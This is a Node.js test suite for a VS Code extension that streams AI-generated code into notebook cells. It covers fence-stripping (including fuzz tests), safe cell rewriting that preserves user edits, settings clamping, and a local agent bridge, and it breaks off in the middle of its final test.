'use strict';
/* Plain-node tests for the logic that does not need a running VS Code:
   fence stripping, live cell writing, and the agent bridge. */
const assert = require('assert');
const http = require('http');
const Module = require('module');
const path = require('path');

// The bridge advertises its port and token in a file. Point it at a throwaway
// directory BEFORE requiring it: this suite used to write over, and then delete,
// the token file of a real bridge running in another VS Code window.
const fs = require('fs');
const os = require('os');
const BRIDGE_HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'ai-notebook-live-test-'));
process.env.AI_NOTEBOOK_LIVE_HOME = BRIDGE_HOME;

// Redirect require('vscode') to the stub before loading extension code.
const stubPath = require.resolve('./vscode-stub.js');
const originalResolve = Module._resolveFilename;
Module._resolveFilename = function (request, ...rest) {
  if (request === 'vscode') return stubPath;
  return originalResolve.call(this, request, ...rest);
};

const vscode = require('./vscode-stub.js');
const { CellWriter, unfence, readOutputs, runCell } = require(path.join('..', 'src', 'notebook.js'));
const notebookModule = require(path.join('..', 'src', 'notebook.js'));
const { Bridge } = require(path.join('..', 'src', 'bridge.js'));

let failures = 0;
let skipped = 0;
const tests = [];
const test = (name, fn) => tests.push([name, fn]);
/** Thrown by a test that cannot run here. Reported as a skip, never as a pass. */
class Skip extends Error {}
const skip = (why) => {
  throw new Skip(why);
};

function newNotebook(cells = []) {
  const notebook = new vscode.NotebookDocument(
    '/tmp/Test_Notebook.ipynb',
    cells.map((c) =>
      typeof c === 'string'
        ? { kind: vscode.NotebookCellKind.Code, value: c, languageId: 'python' }
        : c
    ),
    { metadata: { kernelspec: { language: 'python' } } }
  );
  vscode.__test.notebooks.length = 0;
  vscode.__test.notebooks.push(notebook);
  vscode.__test.executed.length = 0;
  vscode.window.visibleNotebookEditors.length = 0;
  // Everything below used to be cleaned up by whichever test happened to
  // remember, in an ad-hoc `finally`. One omission and a switch left on by an
  // earlier test silently changes the meaning of a later one - the suite is
  // ordering-dependent in exactly that way today. `config` is deliberately NOT
  // reset here: tests configure settings before opening their notebook.
  vscode.__test.edits = 0;
  vscode.__test.failApplyEdit = false;
  vscode.__test.onBeforeApply = null;
  vscode.__test.inputs.length = 0;
  vscode.__test.picks.length = 0;
  vscode.__test.shown.length = 0;
  return notebook;
}

/**
 * Cell executions only. `executed` records EVERY executeCommand the extension
 * makes - setContext among them - so asserting it is empty asserts almost
 * nothing about whether code ran.
 */
function ranCells() {
  return vscode.__test.executed.filter((e) => e.name === 'notebook.cell.execute');
}

/* ------------------------------- unfence -------------------------------- */

test('unfence strips a fenced block with a language tag', () => {
  assert.strictEqual(unfence('```python\nprint(1)\n```'), 'print(1)');
});

test('unfence leaves unfenced code alone', () => {
  assert.strictEqual(unfence('print(1)\n'), 'print(1)\n');
});

test('unfence keeps a fence that is inside a markdown answer body', () => {
  const raw = 'text\n```python\nx=1\n```';
  assert.strictEqual(unfence(raw), raw);
});

test('unfence is prefix-stable while a response streams in', () => {
  const full = '```python\nimport math\nprint(math.pi)\n```';
  const final = unfence(full);
  for (let i = 1; i <= full.length; i += 1) {
    const partial = unfence(full.slice(0, i));
    assert.ok(
      final.startsWith(partial),
      `prefix ${i} produced "${partial}" which is not a prefix of the final text`
    );
  }
});

test('unfence emits nothing while an opening fence is still arriving', () => {
  for (const partial of ['`', '``', '```', '```py', '```python']) {
    assert.strictEqual(unfence(partial), '');
  }
});

/**
 * Every token here exists because of a specific bug. Do not prune this list to
 * make the fuzzer faster - the alphabet is the asset, the string count is not.
 */
const FENCE_TOKENS = [
  '`', //          a lone backtick: R quotes identifiers with these
  '``', //         two backticks: still not a fence
  '```', //        the fence itself
  '````', //       a longer fence, which CommonMark lets close a shorter one
  '```python', //  a fence with an info string
  '``` ', //       trailing whitespace after a marker still closes a fence
  '"""', //        a Python docstring, which may legally contain a fence
  '\n',
  '\r\n', //       CRLF: stripping the stray \r would be a retraction
  '\r', //         a bare CR on its own
  'a',
  'print(1)',
  '~~~', //        tilde fences exist in markdown but are not handled
  // Below here: shapes the alphabet could not reach at all until 2026-09-09, which
  // is exactly why an indented closing fence went unnoticed. A space and a tab can
  // only appear inside '``` ' otherwise, so '\n ' and '\n\t' were unreachable.
  ' ',
  '\t',
  '  ```', //      up to 3 spaces of indent is a legal CommonMark fence
  '   ```',
  '`````', //      a closer may be longer than its opener
  '```py {.hl}', //an info string with attributes
  "'''", //        the other Python string quote
  ' ', //     NBSP: the invisible character models emit most often
  '﻿', //     BOM
  '​', //     zero-width space
  '\u{1f600}', //  a surrogate pair, to catch a cut between its halves
];

/**
 * Seeded so a failure is reproducible from the printed seed, unlike Math.random.
 *
 * Math.imul, not `*`: state * 1103515245 reaches 2.4e18, far past 2^53, so the
 * low bits this keeps were float rounding noise. Measured periods before the
 * fix were 10,466 for most seeds and 220 for seed 777771 - 50,000 draws were
 * really ~2,600 distinct strings.
 */
function lcg(seed) {
  let state = seed;
  return () => {
    state = (Math.imul(state, 1103515245) + 12345) & 0x7fffffff;
    return state / 0x7fffffff;
  };
}

function fuzzStrings(seed, count) {
  const rnd = lcg(seed);
  const out = [];
  for (let n = 0; n < count; n += 1) {
    let s = '';
    const parts = 1 + Math.floor(rnd() * 6);
    for (let i = 0; i < parts; i += 1) s += FENCE_TOKENS[Math.floor(rnd() * FENCE_TOKENS.length)];
    out.push(s);
  }
  return out;
}

test('unfence never retracts text it has already emitted', () => {
  // The contract that matters most in this file. setText is a full reconcile,
  // not an append, so text that is emitted and later withdrawn is DELETED from
  // a cell the user can already see.
  for (const seed of [1, 20260909, 777771, 424242]) {
    for (const raw of fuzzStrings(seed, 12500)) {
      const whole = unfence(raw);
      for (let i = 1; i <= raw.length; i += 1) {
        const partial = unfence(raw.slice(0, i));
        assert.ok(
          whole.startsWith(partial),
          `seed ${seed}: ${JSON.stringify(raw)} at prefix ${i} emitted ` +
            `${JSON.stringify(partial)}, which is not a prefix of ${JSON.stringify(whole)}`
        );
      }
    }
  }
});

/**
 * The other half of the contract, and the half that was missing until 2026-09-09.
 *
 * The retraction test above is satisfied perfectly by a parser that returns ''
 * for everything - measured, it stays green. So it pins only that we never emit
 * too MUCH. This pins that we emit enough: where the input carries no ambiguity
 * at all, streaming must already have the whole answer, because that is what
 * makes a cell fill in as the model types rather than in one jump at the end.
 */
const PLAIN_TOKENS = ['a', 'print(1)', '\n', '\r\n', '\r', ' ', '\t', 'x = 1', '"""', "'''"];

test('unfence emits everything it safely can, not merely something prefix-stable', () => {
  for (const seed of [1, 20260909]) {
    const rnd = lcg(seed);
    for (let n = 0; n < 4000; n += 1) {
      let body = '';
      const parts = 1 + Math.floor(rnd() * 6);
      for (let i = 0; i < parts; i += 1) {
        body += PLAIN_TOKENS[Math.floor(rnd() * PLAIN_TOKENS.length)];
      }
      // No backtick anywhere: there is nothing to be conservative about, so the
      // text is the answer.
      const expected = body.replace(/^\s+/, '');
      assert.strictEqual(
        unfence(body),
        expected,
        `seed ${seed}: unfenced text ${JSON.stringify(body)} must be emitted as it arrives`
      );
      if (!expected) continue;
      // A closed fence around that same text: the closer is already present, so
      // streaming must not wait for the end of the stream to hand back the body.
      assert.strictEqual(
        unfence(`\`\`\`python\n${body}\n\`\`\``),
        body,
        `seed ${seed}: a closed fence around ${JSON.stringify(body)} must emit its body`
      );
    }
  }
});

/**
 * Today's answer for every fence shape we have actually seen, including the ones
 * that are wrong. Rows marked LOSSY are bugs (qa/BUGS.md P2-1) - when they are
 * fixed, the diff of this table is the bug report.
 */
const FENCE_SHAPES = [
  ['plain fenced block', '```python\nprint(1)\n```', 'print(1)'],
  ['no fence at all', 'print(1)\n', 'print(1)\n'],
  ['fence inside a markdown body', 'text\n```python\nx=1\n```', 'text\n```python\nx=1\n```'],
  ['prose before a fence', 'Here is the code:\n```python\nx=1\n```', 'Here is the code:\n```python\nx=1\n```'],
  ['LOSSY fence inside a docstring', '```python\ns = """\n```\nstill\n"""\n```', 's = """'],
  ['LOSSY backtick-quoted R name', '`my var` <- 5', ''],
  ['LOSSY inline code only', '`x`', ''],
  ['LOSSY nested fences', '````markdown\n```python\nprint(1)\n```\n````', ''],
  ['empty fence pair', '```\n```', ''],
  ['unterminated fence', '```python\nprint(1)\nprint(2)', 'print(1)\nprint(2)'],
  ['trailing prose after a fence', '```python\nprint(1)\n```\nand prose', 'print(1)'],
  ['two separate blocks', '```python\nA\n```\n```python\nB\n```', 'A'],
  ['CRLF line endings', '```python\r\nprint(1)\r\n```', 'print(1)\r'],
];

test('unfence handles every fence shape we have actually seen', () => {
  for (const [name, raw, expected] of FENCE_SHAPES) {
    assert.strictEqual(unfence(raw), expected, `${name}: ${JSON.stringify(raw)}`);
  }
});

/**
 * What final mode makes of the same shapes. Compare with FENCE_SHAPES above:
 * every row that changed is a bug that used to lose the user's content.
 */
const FINAL_SHAPES = [
  ['plain fenced block', '```python\nprint(1)\n```', 'print(1)'],
  ['no fence at all', 'print(1)\n', 'print(1)\n'],
  ['fence inside a markdown body', 'text\n```python\nx=1\n```', 'text\n```python\nx=1\n```'],
  // FIXED: used to truncate at the fence inside the string.
  ['fence inside a docstring', '```python\ns = """\n```\nstill\n"""\n```', 's = """\n```\nstill\n"""'],
  // FIXED: used to return '' and the cell was then dropped entirely.
  ['backtick-quoted R name', '`my var` <- 5', '`my var` <- 5'],
  ['inline code only', '`x`', '`x`'],
  ['nested fences', '````markdown\n```python\nprint(1)\n```\n````', '```python\nprint(1)\n```'],
  // Genuinely empty, so '' is the right answer.
  ['empty fence pair', '```\n```', ''],
  ['unterminated fence', '```python\nprint(1)\nprint(2)', 'print(1)\nprint(2)'],
  ['trailing prose after a fence', '```python\nprint(1)\n```\nand prose', 'print(1)'],
  // Accepted regression: indistinguishable from a fence inside a string, so we
  // keep everything and let the syntax error be visible rather than lose half.
  ['two separate blocks', '```python\nA\n```\n```python\nB\n```', 'A\n```\n```python\nB'],
  // The stray \r is deliberate: dropping it would retract a byte we streamed.
  ['CRLF line endings', '```python\r\nprint(1)\r\n```', 'print(1)\r'],
];

test('unfence resolves at the end what streaming had to leave ambiguous', () => {
  for (const [name, raw, expected] of FINAL_SHAPES) {
    assert.strictEqual(unfence(raw, { final: true }), expected, `${name}: ${JSON.stringify(raw)}`);
  }
});

test('a fence whose lines end in a bare CR keeps its contents', () => {
  // The only TOTAL silent content loss in the parser: indexOf('\n') returned -1,
  // so the "body" began at the opener's own backticks, the closing search
  // matched at position 0, and the whole cell came back empty in BOTH modes -
  // produced() then said nothing had arrived and the cell was abandoned.
  assert.strictEqual(unfence('```python\rprint(1)\r```'), 'print(1)');
  assert.strictEqual(unfence('```python\rprint(1)\r```', { final: true }), 'print(1)');
  assert.strictEqual(
    unfence('```py\rimport os\ros.getcwd()', { final: true }),
    'import os\ros.getcwd()',
    'an unclosed bare-CR fence hands back the whole body'
  );
  assert.strictEqual(unfence('```py\rA\nB\n```'), 'A\nB', 'a CR opener then LF lines');

  // The CRLF contract is a separate thing and must not move: the boundary stays
  // the \n, so the trailing \r streaming already emitted is never taken back.
  assert.strictEqual(unfence('```python\r\nprint(1)\r\n```'), 'print(1)\r');
  assert.strictEqual(unfence('```python\r\nprint(1)\r\n```', { final: true }), 'print(1)\r');
});

test('final mode never contradicts what streaming already wrote', () => {
  // The property that makes the whole two-mode design safe. Streaming may only
  // ever be extended by the final answer, never rolled back.
  for (const seed of [1, 20260909, 777771, 424242]) {
    for (const raw of fuzzStrings(seed, 12500)) {
      const resolved = unfence(raw, { final: true });
      for (let i = 1; i <= raw.length; i += 1) {
        const streamed = unfence(raw.slice(0, i));
        assert.ok(
          resolved.startsWith(streamed),
          `seed ${seed}: ${JSON.stringify(raw)} streamed ${JSON.stringify(streamed)} at ` +
            `${i}, which final mode contradicts with ${JSON.stringify(resolved)}`
        );
      }
    }
  }
});

test('an opening fence still emits nothing while it is arriving', () => {
  // The sibling of the streaming assertion above: the two modes are pinned side
  // by side so the distinction stays visible.
  for (const partial of ['`', '``', '```', '```py', '```python']) {
    assert.strictEqual(unfence(partial), '', `streaming: ${JSON.stringify(partial)}`);
  }
  assert.strictEqual(unfence('`', { final: true }), '`', 'but at the end a backtick is content');
  assert.strictEqual(unfence('```', { final: true }), '', 'an opener with no body is empty');
  assert.strictEqual(unfence('```python', { final: true }), '');
});

/* ------------------------------ CellWriter ------------------------------ */

test('insert streams chunks into a new cell and strips fences', async () => {
  const notebook = newNotebook(['x = 1']);
  const writer = await CellWriter.insert(notebook, 1, { kind: 'code' });
  assert.strictEqual(notebook.cellCount, 2);
  for (const chunk of ['```pyth', 'on\nprint(', 'x)\n', '```']) {
    writer.write(chunk);
    await writer.flush();
  }
  const text = await writer.end();
  assert.strictEqual(text, 'print(x)');
  assert.strictEqual(notebook.cellAt(1).document.getText(), 'print(x)');
});

test('writer survives cells shifting underneath it', async () => {
  const notebook = newNotebook(['a = 1', 'b = 2']);
  const writer = await CellWriter.insert(notebook, 2, { kind: 'code' });
  writer.write('print(a + b)');
  // Something else inserts a cell above ours mid-stream.
  const edit = new vscode.WorkspaceEdit();
  edit.set(notebook.uri, [
    vscode.NotebookEdit.insertCells(0, [
      new vscode.NotebookCellData(vscode.NotebookCellKind.Code, '# header', 'python'),
    ]),
  ]);
  await vscode.workspace.applyEdit(edit);
  const text = await writer.end();
  assert.strictEqual(text, 'print(a + b)');
  assert.strictEqual(writer.index, 3);
  assert.strictEqual(notebook.cellAt(3).document.getText(), 'print(a + b)');
  assert.strictEqual(notebook.cellAt(0).document.getText(), '# header');
});

test('replace rewrites an existing cell in place', async () => {
  const notebook = newNotebook(['prnt("typo")']);
  const writer = await CellWriter.replace(notebook, notebook.cellAt(0));
  assert.strictEqual(
    notebook.cellAt(0).document.getText(),
    'prnt("typo")',
    'the original must survive until the model produces something'
  );
  writer.write('print("typo")');
  const replaced = await writer.end();
  await runCell(notebook, writer.index);
  assert.strictEqual(replaced, 'print("typo")');
  assert.strictEqual(notebook.cellCount, 1);
  assert.strictEqual(notebook.cellAt(0).document.getText(), 'print("typo")');
  assert.deepStrictEqual(vscode.__test.executed[0].payload.ranges, [{ start: 0, end: 1 }]);
});

test('markdown cells keep their fenced code blocks', async () => {
  const notebook = newNotebook(['x = 1']);
  const writer = await CellWriter.insert(notebook, 0, { kind: 'markdown', fenced: false });
  writer.write('## Setup\n\n```python\nx = 1\n```');
  const text = await writer.end();
  assert.ok(text.includes('```python'));
  assert.strictEqual(notebook.cellAt(0).kind, vscode.NotebookCellKind.Markup);
});

test('empty generations leave an empty cell the caller can drop', async () => {
  const notebook = newNotebook([]);
  const writer = await CellWriter.insert(notebook, 0, { kind: 'code' });
  const text = await writer.end();
  assert.strictEqual(text, '');
  assert.strictEqual(vscode.__test.executed.length, 0, 'must not execute an empty cell');
});

test('a backtick-quoted name is written, not silently swallowed', async () => {
  // The user-visible bug: `x` unfenced to '', produced() said nothing had been
  // produced, abandon() removed the cell, and NOTHING HAPPENED. Worst on R
  // kernels, where backticks quote identifiers.
  const notebook = newNotebook(['seed = 1']);
  const writer = await CellWriter.insert(notebook, 1, { kind: 'code' });
  for (const chunk of ['`my ', 'var` ', '<- 5']) {
    writer.write(chunk);
    await writer.flush();
  }
  assert.ok(writer.produced(), 'the model plainly produced something');
  const text = await writer.end();
  assert.strictEqual(text, '`my var` <- 5');
  assert.strictEqual(notebook.cellAt(1).document.getText(), '`my var` <- 5');
});

test('produced, end and abandon all agree about what the model produced', async () => {
  // These three must read the stream the same way. If produced() resolved the
  // ambiguity but end() did not, a cell would survive the empty-drop and then
  // be written as ''.
  const notebook = newNotebook(['seed = 1']);
  const writer = await CellWriter.insert(notebook, 1, { kind: 'code' });
  writer.write('`x`');
  assert.ok(writer.produced(), 'produced() sees content');
  assert.strictEqual(await writer.end(), '`x`', 'and end() writes the same content');

  const second = await CellWriter.insert(notebook, 2, { kind: 'code' });
  second.write('`x`');
  const { partial } = await second.abandon();
  assert.strictEqual(partial, '`x`', 'and abandon() hands back the same content');
});

test('a user typing into a streaming cell keeps their text', async () => {
  // The cell is a full reconcile target, so the next flush used to overwrite
  // whatever the user had typed with the model's version of the cell.
  const notebook = newNotebook(['seed = 1']);
  const writer = await CellWriter.insert(notebook, 1, { kind: 'code' });
  writer.write('line1\n');
  await writer.flush();

  notebook.cellAt(1).document.text = 'USER TYPED THIS';
  writer.write('line2\n');
  await writer.flush();

  assert.strictEqual(
    notebook.cellAt(1).document.getText(),
    'USER TYPED THIS',
    'the AI must not write over a person'
  );
  assert.ok(writer.foreign, 'and it knows it lost the cell');
  assert.ok(!writer.failed, 'a foreign edit is not an error');
  const text = await writer.end();
  assert.strictEqual(text, 'USER TYPED THIS', 'end() reports the document, not the intent');
});

test('a cell the user edited is never executed', async () => {
  // The dangerous half of the fix: end() now returns the USER'S text, and that
  // text used to flow straight into the execution policy.
  const extension = require(path.join('..', 'extension.js'));
  const notebook = newNotebook(['answer = 42']);
  const editor = { notebook, selection: { start: 0, end: 1 }, revealRange() {} };
  vscode.window.visibleNotebookEditors.push(editor);
  vscode.window.activeNotebookEditor = editor;
  vscode.__test.config.set('aiNotebookLive.execution', 'always');
  vscode.__test.executed.length = 0;

  const writer = await CellWriter.insert(notebook, 1, { kind: 'code' });
  writer.write('print("generated")');
  await writer.flush();
  notebook.cellAt(1).document.text = 'import os  # half typed';
  writer.write(' more');
  await writer.flush();
  try {
    assert.ok(writer.foreign);
    assert.strictEqual(
      vscode.__test.executed.length,
      0,
      'nothing the user typed may be executed under an AI grant'
    );
  } finally {
    vscode.__test.config.clear();
    vscode.window.activeNotebookEditor = undefined;
    vscode.window.visibleNotebookEditors.length = 0;
  }
});

test('an autosave that trims trailing whitespace does not stop the stream', async () => {
  // The one false positive worth tolerating: a save is not a person typing.
  const notebook = newNotebook(['seed = 1']);
  const writer = await CellWriter.insert(notebook, 1, { kind: 'code' });
  writer.write('print(1)\n\n');
  await writer.flush();
  notebook.cellAt(1).document.text = 'print(1)';
  writer.write('print(2)\n');
  await writer.flush();
  assert.ok(!writer.foreign, 'trailing whitespace alone must not look like an edit');
  assert.match(notebook.cellAt(1).document.getText(), /print\(2\)/, 'and the stream continues');
});

test('end() after abandon() cannot resurrect the discarded partial', async () => {
  // end()'s final write used force:true, which bypassed the closed guard and
  // overwrote the original that abandon() had just restored.
  const notebook = newNotebook(['answer = 42  # hard-won']);
  const writer = await CellWriter.replace(notebook, notebook.cellAt(0));
  writer.write('answer = ');
  await writer.abandon();
  await assert.rejects(() => writer.end(), /abandoned/);
  assert.strictEqual(
    notebook.cellAt(0).document.getText(),
    'answer = 42  # hard-won',
    'the restore stands'
  );
});

test('keeping what the AI wrote still works after a restore', async () => {
  // Making force stop being a bypass would otherwise silently break the
  // recovery button, which is the only way back to the partial.
  const notebook = newNotebook(['answer = 42']);
  const writer = await CellWriter.replace(notebook, notebook.cellAt(0));
  writer.write('answer = 43');
  const { partial } = await writer.abandon();
  assert.strictEqual(notebook.cellAt(0).document.getText(), 'answer = 42');
  assert.ok(await writer.keepPartial(partial), 'the user can ask for the partial back');
  assert.strictEqual(notebook.cellAt(0).document.getText(), 'answer = 43');
});

test('abandon() is idempotent', async () => {
  const notebook = newNotebook(['orig']);
  const writer = await CellWriter.replace(notebook, notebook.cellAt(0));
  writer.write('partial');
  // Flush first. Without this the document never diverges from 'orig', so both
  // calls are no-ops against a cell that was already correct and the assertion
  // below holds however wrong abandon() is - measured: making abandon()
  // non-idempotent left this test green.
  await writer.flush();
  assert.strictEqual(notebook.cellAt(0).document.getText(), 'partial');

  const first = await writer.abandon();
  assert.strictEqual(first.restored, true, 'the first call does the restoring');
  assert.strictEqual(notebook.cellAt(0).document.getText(), 'orig');

  const editsBefore = vscode.__test.edits;
  const second = await writer.abandon();
  assert.strictEqual(second.restored, false, 'the second has nothing left to restore');
  // The point of idempotence is not "ends up the same" but "does nothing".
  assert.strictEqual(
    vscode.__test.edits,
    editsBefore,
    'a second abandon must apply no edit at all, not a harmless one'
  );
  assert.strictEqual(notebook.cellAt(0).document.getText(), 'orig');
  assert.strictEqual(notebook.cellCount, 1);
});

test('a failed replace hands the cell back exactly as it was', async () => {
  const notebook = newNotebook(['answer = 42  # hard-won']);
  const writer = await CellWriter.replace(notebook, notebook.cellAt(0));
  writer.write('answer = ');
  await writer.flush();
  const { restored, partial } = await writer.abandon();
  assert.ok(restored);
  assert.strictEqual(partial, 'answer = ', 'the partial is offered back to the caller');
  assert.strictEqual(
    notebook.cellAt(0).document.getText(),
    'answer = 42  # hard-won',
    'the user gets their own code back, not a half-written statement'
  );
});

test('abandon() says so when it could NOT put the cell back', async () => {
  // The worst of the data-loss paths. setText correctly refuses to overwrite a
  // cell the user has typed into - but abandon() reported restored:true anyway,
  // so pump told them "your cell was put back" while their original was gone.
  const notebook = newNotebook(['answer = 42  # took me an hour']);
  const writer = await CellWriter.replace(notebook, notebook.cellAt(0));
  writer.write('answer = ');
  await writer.flush();

  // The user types. The writer stops, as designed.
  notebook.cellAt(0).document.text = 'answer = MY OWN EDIT';

  const { restored } = await writer.abandon();
  assert.strictEqual(restored, false, 'it declined to restore, and must say so');
  assert.ok(writer.foreign, 'and it knows why');
  assert.strictEqual(
    notebook.cellAt(0).document.getText(),
    'answer = MY OWN EDIT',
    'what the user typed is still exactly there'
  );
});

test('"keep what the AI wrote" cannot overwrite what the user typed', async () => {
  // The button offered by the message above. It re-synced `written` from the
  // document, which made owns() pass unconditionally and turned it into a blind
  // force-write: the user lost their original AND their typing.
  const notebook = newNotebook(['answer = 42  # took me an hour']);
  const writer = await CellWriter.replace(notebook, notebook.cellAt(0));
  writer.write('answer = 43');
  await writer.flush();
  notebook.cellAt(0).document.text = 'MY NOTES I JUST TYPED';

  await writer.abandon();
  const kept = await writer.keepPartial('answer = 43');
  assert.strictEqual(kept, false, 'it must refuse, not overwrite');
  assert.strictEqual(
    notebook.cellAt(0).document.getText(),
    'MY NOTES I JUST TYPED',
    'the typing survives'
  );
});

test('keepPartial refuses on a writer that never abandoned anything', async () => {
  // Reachable from the floating .then() in pump: the dialog can be answered long
  // after the command finished, over a cell a later revise is using.
  const notebook = newNotebook(['live = "content"']);
  const writer = await CellWriter.replace(notebook, notebook.cellAt(0));
  const kept = await writer.keepPartial('clobber');
  assert.strictEqual(kept, false, 'there was no restore to undo');
  assert.strictEqual(notebook.cellAt(0).document.getText(), 'live = "content"');
});

test('keepPartial still works for the case it exists for', async () => {
  // Guarding it is only correct if the real path survives: a clean restore, then
  // the user asking for the AI's partial back.
  const notebook = newNotebook(['original']);
  const writer = await CellWriter.replace(notebook, notebook.cellAt(0));
  writer.write('the partial');
  await writer.flush();
  const { restored, partial } = await writer.abandon();
  assert.strictEqual(restored, true);
  assert.strictEqual(notebook.cellAt(0).document.getText(), 'original');
  const kept = await writer.keepPartial(partial);
  assert.strictEqual(kept, true, 'the ordinary path must not be broken by the guard');
  assert.strictEqual(notebook.cellAt(0).document.getText(), 'the partial');
});

test('a writer abandoned after a restore cannot clobber it later', async () => {
  // The landmine: write() checked `closed` but flush() did not, so a flush that
  // was still in flight landed after the restore and overwrote it again.
  const notebook = newNotebook(['keep = "me"']);
  const writer = await CellWriter.replace(notebook, notebook.cellAt(0));
  writer.write('destroyed = True');
  await writer.abandon();
  writer.write('and again');
  await writer.flush();
  await writer.flush();
  assert.strictEqual(
    notebook.cellAt(0).document.getText(),
    'keep = "me"',
    'nothing may write through a writer that has been abandoned'
  );
});

test('an abandoned insert removes its own cell and leaves neighbours alone', async () => {
  const notebook = newNotebook(['first', 'second']);
  const writer = await CellWriter.insert(notebook, 1, { kind: 'code' });
  writer.write('half a thought');
  await writer.flush();
  await writer.abandon();
  assert.strictEqual(notebook.cellCount, 2);
  assert.strictEqual(notebook.cellAt(0).document.getText(), 'first');
  assert.strictEqual(notebook.cellAt(1).document.getText(), 'second');
});

test('end() reports the document, and throws instead of faking success', async () => {
  const notebook = newNotebook([]);
  const writer = await CellWriter.insert(notebook, 0, { kind: 'code' });
  writer.write('print("real")');
  const text = await writer.end();
  assert.strictEqual(text, 'print("real")');
  assert.strictEqual(text, notebook.cellAt(0).document.getText(), 'the return value IS the document');

  const second = await CellWriter.insert(notebook, 1, { kind: 'code' });
  second.write('print("this edit will fail")');
  vscode.__test.failApplyEdit = true;
  try {
    await assert.rejects(() => second.end(), /Could not write into the cell/);
  } finally {
    vscode.__test.failApplyEdit = false;
  }
});

test('two concurrent inserts never claim the same cell', async () => {
  const notebook = newNotebook(['x = 1']);
  let release;
  const gate = new Promise((r) => {
    release = r;
  });
  // Hold the first insert inside applyEdit while the second one runs to
  // completion, which is exactly the window the index-based claim lost.
  let first = true;
  vscode.__test.onBeforeApply = async () => {
    if (!first) return;
    first = false;
    await gate;
  };
  try {
    const a = CellWriter.insert(notebook, 1, { kind: 'code' });
    const b = CellWriter.insert(notebook, 1, { kind: 'code' });
    release();
    const [wa, wb] = await Promise.all([a, b]);
    assert.notStrictEqual(wa.uri, wb.uri, 'each writer must own a distinct cell');
    wa.write('AAA');
    wb.write('BBB');
    await Promise.all([wa.end(), wb.end()]);
    const texts = notebook.getCells().map((c) => c.document.getText());
    assert.ok(texts.includes('AAA'), 'the first agent kept its content');
    assert.ok(texts.includes('BBB'), 'the second agent kept its content');
  } finally {
    vscode.__test.onBeforeApply = null;
  }
});

test('revising a markdown cell keeps its fenced code blocks', async () => {
  const notebook = newNotebook([
    { kind: vscode.NotebookCellKind.Markup, value: '# notes', languageId: 'markdown' },
  ]);
  const writer = await CellWriter.replace(notebook, notebook.cellAt(0));
  writer.write('## notes\n\n```python\nx = 1\n```');
  const text = await writer.end();
  assert.ok(text.includes('```python'), 'markdown must not be unfenced');
});

/* ------------------------------ readOutputs ----------------------------- */

test('readOutputs pulls errors and stdout out of a cell', () => {
  const notebook = newNotebook(['1/0']);
  const cell = notebook.cellAt(0);
  cell.outputs = [
    {
      items: [
        {
          mime: 'application/vnd.code.notebook.error',
          data: Buffer.from(
            JSON.stringify({ name: 'ZeroDivisionError', message: 'division by zero', stack: 'line 1' })
          ),
        },
        { mime: 'application/vnd.code.notebook.stdout', data: Buffer.from('before the crash\n') },
      ],
    },
  ];
  const { error, text } = readOutputs(cell);
  assert.match(error, /ZeroDivisionError: division by zero/);
  assert.strictEqual(text, 'before the crash\n');
});

/* -------------------------------- config --------------------------------- */

const configModule = require(path.join('..', 'src', 'config.js'));

test('the deprecated autoRun boolean migrates without surprising anyone', async () => {
  const c = vscode.__test.config;
  c.clear();
  // Never touched: the safe middle, not either old extreme.
  assert.strictEqual(configModule.settings().execution, 'ask');

  // Someone who turned it on keeps having their cells run.
  c.set('aiNotebookLive.autoRun', true);
  assert.strictEqual(configModule.settings().execution, 'always');

  // Someone who deliberately turned it off must not start being asked.
  c.set('aiNotebookLive.autoRun', false);
  assert.strictEqual(configModule.settings().execution, 'never');

  // An explicit new-style value always wins over the old one.
  c.set('aiNotebookLive.execution', 'ask');
  assert.strictEqual(configModule.settings().execution, 'ask');

  // Bridge execution is deliberately NOT migrated: letting a local agent run
  // code is a different decision, and autoRun was never an opt-in to it.
  c.clear();
  c.set('aiNotebookLive.autoRun', true);
  assert.strictEqual(configModule.settings().bridgeExecution, 'never');
  c.clear();
});

test('settings are clamped, so a bad value cannot become a bad request', async () => {
  const c = vscode.__test.config;
  c.clear();
  c.set('aiNotebookLive.maxTokens', 9_000_000);
  c.set('aiNotebookLive.contextCells', -7);
  c.set('aiNotebookLive.bridge.port', 80);
  c.set('aiNotebookLive.systemPromptExtra', 'x'.repeat(5000));
  const s = configModule.settings();
  assert.strictEqual(s.maxTokens, 64000);
  assert.strictEqual(s.contextCells, 12, 'a nonsense count falls back to the default');
  assert.strictEqual(s.bridgePort, 37417, 'a privileged port falls back to the default');
  assert.strictEqual(s.systemPromptExtra.length, 2000, 'house style cannot become an essay');

  c.set('aiNotebookLive.contextCells', -1);
  assert.strictEqual(configModule.settings().contextCells, -1, '-1 still means the whole notebook');
  c.set('aiNotebookLive.bridge.port', 0);
  assert.strictEqual(configModule.settings().bridgePort, 0, '0 still means pick a free port');
  c.clear();
});

/* -------------------------------- nbpush -------------------------------- */

const nbpush = require(path.join('..', 'bin', 'nbpush.js'));

test('nbpush --replace and --list actually parse', () => {
  // Both were announced in the 0.5.0 CHANGELOG and handled further down in the
  // file, and neither was ever added to the parser - so both hit "unexpected
  // argument" and exit 2 while the code reading them sat unreachable.
  const listed = nbpush.parseArgs(['--list']);
  assert.strictEqual(listed.list, true);
  const rep = nbpush.parseArgs(['--replace', '2']);
  assert.strictEqual(rep.replace, 2);
});

test('nbpush --replace on a pipe replaces, and never appends', async () => {
  // The bug that put a junk cell in a real notebook. --replace only routed to
  // /cell/replace when the content came from --code or --file; with piped stdin
  // it fell through to the streaming branch, which ignores the flag entirely -
  // so it silently ADDED a cell instead of rewriting one. Additive and
  // destructive are exactly the two things this endpoint keeps apart.
  const original = 'keep = "me"';
  const notebook = newNotebook(['first', original]);
  const bridge = new Bridge({
    resolveNotebook: () => notebook,
    decideRun: async () => ({ run: false, reason: 'test policy' }),
    infoDir: BRIDGE_HOME,
  });
  const { port, token } = await bridge.start(0);
  try {
    const res = await call(port, token, {
      path: `/cell/replace?index=1&expect=${encodeURIComponent(original)}`,
      body: JSON.stringify({ code: 'keep = "replaced"' }),
    });
    assert.strictEqual(res.status, 200);
    assert.strictEqual(notebook.cellCount, 2, 'replacing must never add a cell');
    assert.strictEqual(notebook.cellAt(1).document.getText(), 'keep = "replaced"');
    // And the routing itself: with a pipe, --replace must not reach /cell.
    // Scoped to the stream request's OWN options object rather than a 400-char
    // window after it. The window also covered the code that prints where the
    // push landed, which legitimately reads args.replace to say "replaced cell
    // N" instead of "added a cell" - so the guard failed on a change it was
    // never meant to catch.
    const src = fs.readFileSync(path.join(__dirname, '..', 'bin', 'nbpush.js'), 'utf8');
